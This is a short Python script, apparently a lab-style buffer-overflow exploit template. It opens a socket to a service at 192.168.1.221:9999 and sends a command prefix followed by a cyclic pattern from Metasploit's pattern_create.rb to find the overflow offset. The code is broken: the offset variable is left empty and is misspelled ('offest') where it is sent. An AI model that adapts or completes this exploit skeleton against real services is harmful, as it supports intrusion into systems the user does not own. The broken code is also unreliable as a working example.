#!/usr/bin/python
import sys, socket

offset =
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (fuzzing value)

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.221',9999))
	s.send(('COMMAND  /.:/' + offest))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
